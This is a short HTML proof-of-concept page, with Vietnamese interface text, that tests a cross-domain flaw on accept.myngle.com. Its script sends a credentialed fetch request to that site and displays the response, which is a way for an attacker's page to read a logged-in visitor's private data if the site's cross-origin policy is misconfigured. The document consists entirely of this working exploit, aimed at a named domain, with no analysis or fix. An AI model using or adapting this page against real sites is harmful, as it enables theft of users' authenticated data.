<!DOCTYPE html>
<html>
<head>
  <title>Crossdomain PoC - accept.myngle.com</title>
</head>
<body>
  <h2>PoC: Đọc dữ liệu từ accept.myngle.com</h2>
  <pre id="output">Đang thử gửi yêu cầu...</pre>

  <script>
    fetch("https://accept.myngle.com/", {
      method: "GET",
      credentials: "include"
    })
    .then(response => response.text())
    .then(data => {
      document.getElementById("output").textContent = data;
    })
    .catch(error => {
      document.getElementById("output").textContent = "❌ Lỗi: " + error;
    });
  </script>
</body>
</html>
